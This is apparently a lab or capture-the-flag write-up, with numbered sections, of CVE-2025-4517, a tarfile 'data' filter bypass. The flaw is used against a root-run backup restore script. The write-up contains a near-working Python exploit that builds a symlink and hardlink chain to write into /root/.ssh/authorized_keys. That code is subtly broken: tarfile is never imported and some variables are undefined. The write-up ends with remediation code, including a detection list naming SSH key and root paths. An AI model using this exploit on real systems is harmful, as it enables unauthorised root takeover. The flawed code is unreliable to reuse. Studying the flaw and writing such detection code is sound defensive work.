4.3 Security Controls Analysis

Implemented Controls:

  1. Filename validation (must match backup_<digits>.tar)
  2. Restore directory validation (must match restore_<alphanumeric>)
  3. Fixed base directories (no path traversal in arguments)
  4. Use of filter="data" (supposedly safe extraction filter)

Weakness Identified: Despite using the “data” filter, the script is vulnerable to CVE-2025-4517, which bypasses the filter’s path validation through PATH_MAX overflow exploitation.

4.4 CVE-2025-4517 Vulnerability Details

CVE ID: CVE-2025-4517
Component: Python tarfile module (versions prior to patch)
Affected Python Version on Target: Python 3.12.3
CVSS Score: 9.8 (Critical)
Vulnerability Type: Path Traversal / Arbitrary File Write

Root Cause: The tarfile “data” filter relies on os.path.realpath() to canonicalize paths and validate they don’t escape the extraction directory. However, when symlink resolution produces paths exceeding PATH_MAX (4096 bytes on Linux), realpath() fails to fully canonicalize the path but does not raise an error. This causes:

  1. The filter receives an incomplete/truncated canonical path
  2. The security check passes incorrectly
  3. During extraction, the filesystem follows the actual symlink chain
  4. Files can be written outside the intended extraction directory

Attack Vector: By crafting a tar archive with deeply nested symlinks that expand beyond PATH_MAX during resolution, an attacker can bypass the “data” filter and achieve arbitrary file write as the user running the extraction (in this case, root via sudo).

import os
import io

EVIL_TAR_NAME = "backup_1337.tar"
TRAVERSAL_PATH = "/../../../../root/.ssh/authorized_keys"

steps = "abcdefghijklmnop"  # 16 levels deep
path = ""

with tarfile.open(EVIL_TAR_NAME, mode="x") as tar:
    # Build 16-level symlink chain
    for i in steps:
        # Create long directory
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        
        # Create short symlink pointing to long directory
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        
        path = os.path.join(path, comp)
    
    # Create extremely long symlink that exceeds PATH_MAX
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)
    
    # Create escape symlink pointing outside extraction directory
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + TRAVERSAL_PATH
    tar.addfile(e)
    
    # Create hardlink to the escape target
    f = tarfile.TarInfo("flaglink")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape"
    tar.addfile(f)

    c = tarfile.TarInfo("flaglink")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))

6. Technical Deep Dive

6.1 CVE-2025-4517 Exploitation Mechanics

6.1.1 PATH_MAX Limitation

#define PATH_MAX 4096  // Maximum path length in Linux

When a path exceeds this limit during symlink resolution, os.path.realpath() behavior becomes undefined/incomplete.

6.1.2 Symlink Expansion Calculation

Single Level:

  • Directory name: 247 characters
  • Symlink name: 1 character
  • When resolved: 247 characters

16 Levels Deep:

  • Base path: a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/
  • Each letter resolves to 247 ‘d’ characters
  • Total expanded length: 16 × 247 = 3,952 bytes

Final Long Symlink:

  • Path: a/b/c/.../p/lll...lll (254 ‘l’ characters)
  • When fully expanded: 3,952 + 254 = 4,206 bytes
  • Result: Exceeds PATH_MAX by 110 bytes

6.1.3 Filter Bypass Mechanism

Normal Operation (Safe Path):

# Input: "test/file.txt"
real_path = os.path.realpath("/opt/backup_clients/restored_backups/restore_exploit/test/file.txt")
# Result: "/opt/backup_clients/restored_backups/restore_exploit/test/file.txt"

# Validation check:
if real_path.startswith(extraction_dir):
    # SAFE - path is within extraction directory
    allow_extraction()

Exploited Operation (CVE-2025-4517):

# Input: "a/b/c/.../p/lll...lll" (> PATH_MAX when resolved)
real_path = os.path.realpath("/opt/backup_clients/restored_backups/restore_exploit/a/b/c/.../p/lll...")
# Result: INCOMPLETE CANONICALIZATION
# Returns: "/opt/backup_clients/restored_backups/restore_exploit/a/b/c/..."
#          (truncated or partially resolved)

# Validation check:
if real_path.startswith(extraction_dir):
    # INCORRECTLY PASSES - path appears safe due to incomplete resolution
    allow_extraction()

# During actual filesystem operations:
# Kernel fully resolves symlinks according to filesystem rules
# Final resolution: /root/.ssh/authorized_keys (OUTSIDE extraction directory!)

6.1.4 Hardlink Abuse

Why Hardlinks Matter:

  • Hardlinks reference the same inode as the target file
  • Writing to a hardlink writes to the original file
  • Hardlinks bypass typical path-based security checks

Exploitation Flow:

1. Create symlink "escape" -> /root/.ssh/authorized_keys (via long path)
2. Create hardlink "flaglink" -> "escape"
3. Write SSH key to "flaglink"
4. Result: SSH key written to /root/.ssh/authorized_keys

Filesystem Perspective:

/opt/backup_clients/restored_backups/restore_exploit/
├── escape -> /root/.ssh/authorized_keys  (symlink - bypassed filter)
└── flaglink -> escape                     (hardlink - references same inode)

/root/.ssh/
└── authorized_keys                        (MODIFIED - SSH key injected)

6.3 Attack Surface Analysis

Key Insight: While the Python script itself had robust input validation, the vulnerability existed in a dependency (Python’s tarfile module). This demonstrates the importance of:

  1. Keeping all dependencies updated
  2. Understanding the security properties of third-party code
  3. Defense in depth (multiple layers of security)
  4. Regular vulnerability scanning of the entire stack

8.2.1 Implement Defense in Depth

Add Additional Validation to Backup Script:

# Add at the start of restore_backup_clients.py

import hashlib

ALLOWED_TAR_HASHES = {
    "sha256_hash_1": "backup_1001.tar",
    "sha256_hash_2": "backup_1002.tar",
    # Whitelist of known-good backup hashes
}

def validate_tar_integrity(filepath):
    """Verify tar file hasn't been tampered with"""
    sha256_hash = hashlib.sha256()
    with open(filepath, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    
    computed_hash = sha256_hash.hexdigest()
    if computed_hash not in ALLOWED_TAR_HASHES:
        print(f"[!] Unauthorized tar file detected", file=sys.stderr)
        sys.exit(1)

Implement Tar Scanning:

def scan_tar_for_suspicious_content(tar_path):
    """Scan tar for malicious patterns"""
    suspicious_patterns = [
        r"\.\.\/",  # Path traversal
        r"^\/",     # Absolute paths
        r"authorized_keys",
        r"\.ssh",
        r"\/etc\/",
        r"\/root\/"
    ]
    
    with tarfile.open(tar_path, "r") as tar:
        for member in tar.getmembers():
            # Check for suspicious names
            for pattern in suspicious_patterns:
                if re.search(pattern, member.name):
                    print(f"[!] Suspicious content detected: {member.name}")
                    return False
            
            # Check for symlinks pointing outside
            if member.issym() or member.islnk():
                if member.linkname.startswith('/') or '..' in member.linkname:
                    print(f"[!] Suspicious link: {member.name} -> {member.linkname}")
                    return False
    
    return True
